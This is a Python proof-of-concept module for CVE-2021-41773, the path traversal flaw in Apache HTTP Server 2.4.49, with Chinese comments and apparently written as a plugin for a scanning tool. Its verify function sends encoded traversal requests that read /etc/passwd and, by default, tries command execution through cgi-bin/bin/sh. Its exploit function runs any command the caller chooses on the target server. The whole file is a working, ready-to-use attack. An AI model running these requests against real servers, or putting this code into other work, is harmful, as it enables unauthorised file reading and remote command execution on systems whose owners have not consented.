#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Apache HTTP Server 2.4.49 路径穿越漏洞 (CVE-2021-41773) POC
"""

import re
import requests
from typing import Tuple, Dict, Any, Optional

# POC信息
name = "Apache HTTP Server 2.4.49 路径穿越漏洞"
description = "Apache HTTP Server 2.4.49版本中存在路径穿越漏洞，攻击者可以利用此漏洞读取Web目录之外的文件或执行服务器上的代码。"
author = "NetTools"
type = "路径穿越"
severity = "critical"  # 严重程度: critical, high, medium, low, info

def verify(target: str, session=None, **kwargs) -> Tuple[bool, str]:
    """
    验证目标是否存在漏洞
    
    Args:
        target: 目标URL
        session: 请求会话对象
        **kwargs: 其他参数
        
    Returns:
        (是否存在漏洞, 详细信息)
    """
    # 确保目标URL以/结尾
    if not target.endswith('/'):
        target = target + '/'
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    # 漏洞测试路径
    test_path = "icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    test_url = target + test_path
    
    try:
        # 发送请求
        response = session.get(
            test_url,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        
        # 检查响应状态和内容
        if (response.status_code == 200 or response.status_code == 403) and (
            "root:" in response.text or "nobody:" in response.text or "daemon:" in response.text
        ):
            # 发现漏洞
            details = f"发现Apache路径穿越漏洞(CVE-2021-41773)，能够读取/etc/passwd文件"
            return True, details
            
        # 尝试第二种路径
        test_path2 = "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        test_url2 = target + test_path2
        
        response2 = session.get(
            test_url2,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False
        )
        
        if (response2.status_code == 200 or response2.status_code == 403) and (
            "root:" in response2.text or "nobody:" in response2.text or "daemon:" in response2.text
        ):
            # 发现漏洞
            details = f"发现Apache路径穿越漏洞(CVE-2021-41773)，能够读取/etc/passwd文件"
            return True, details
        
        # 尝试检测RCE漏洞
        if kwargs.get('check_rce', True):
            # 命令执行漏洞测试，尝试获取系统信息
            rce_path = "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
            rce_url = target + rce_path
            rce_payload = "echo; id"
            
            rce_response = session.post(
                rce_url,
                data=rce_payload,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            )
            
            if "uid=" in rce_response.text and "gid=" in rce_response.text:
                # 发现命令执行漏洞
                details = f"发现Apache路径穿越RCE漏洞(CVE-2021-41773)，能够执行系统命令:\n{rce_response.text}"
                return True, details
        
        return False, "目标不存在CVE-2021-41773漏洞"
        
    except requests.RequestException as e:
        return False, f"验证过程中发生请求异常: {str(e)}"
    except Exception as e:
        return False, f"验证过程中发生未知错误: {str(e)}"

def exploit(target: str, session=None, command="id", **kwargs) -> Tuple[bool, str]:
    """
    利用漏洞执行命令
    
    Args:
        target: 目标URL
        session: 请求会话对象
        command: 要执行的命令
        **kwargs: 其他参数
        
    Returns:
        (是否成功, 命令输出)
    """
    # 确保目标URL以/结尾
    if not target.endswith('/'):
        target = target + '/'
    
    # 使用提供的会话或创建新会话
    if session is None:
        session = requests.Session()
    
    # 设置请求超时
    timeout = kwargs.get('timeout', 10)
    verify_ssl = kwargs.get('verify', False)
    
    try:
        # 命令执行路径
        rce_path = "cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        rce_url = target + rce_path
        rce_payload = f"echo; {command}"
        
        # 发送请求
        response = session.post(
            rce_url,
            data=rce_payload,
            timeout=timeout,
            verify=verify_ssl,
            allow_redirects=False,
            headers={
                "Content-Type": "application/x-www-form-urlencoded"
            }
        )
        
        # 检查响应
        if response.status_code == 200:
            # 提取命令输出
            output = response.text.strip()
            return True, output
        else:
            return False, f"命令执行失败，HTTP状态码: {response.status_code}"
            
    except requests.RequestException as e:
        return False, f"命令执行时发生请求异常: {str(e)}"
    except Exception as e:
        return False, f"命令执行时发生未知错误: {str(e)}" 